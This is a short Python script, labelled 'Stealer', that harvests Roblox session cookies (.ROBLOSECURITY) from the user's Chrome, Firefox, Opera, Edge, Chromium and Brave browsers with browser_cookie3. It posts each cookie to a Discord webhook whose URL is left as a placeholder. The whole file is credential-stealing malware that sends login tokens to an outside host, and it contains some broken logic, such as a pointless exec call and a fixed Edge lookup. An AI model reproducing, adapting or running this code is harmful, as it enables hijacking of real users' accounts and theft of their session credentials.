from dhooks import Webhook, Embed
import browser_cookie3 as bc
from threading import Thread

def send(token):
    hook = Webhook("webhook link here")

    embed=Embed(title="Stealer", color=0xff0000)
    embed.add_field(name="Roblox Cookie", value=str(token), inline=True)

    hook.send(embed=embed)

def get_cookie(browsers):
    for browser in browsers:
        try:
            exec('cookie = str(bc.'+browser+'(domain_name="roblox.com"))')
            cookie = str(bc.edge(domain_name="roblox.com"))
            cookie = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
            send(cookie)
            Thread(target=cookie).start()
        except:
            pass

browsers=['chrome','firefox','opera','edge','chromium','brave']
get_cookie(browsers)
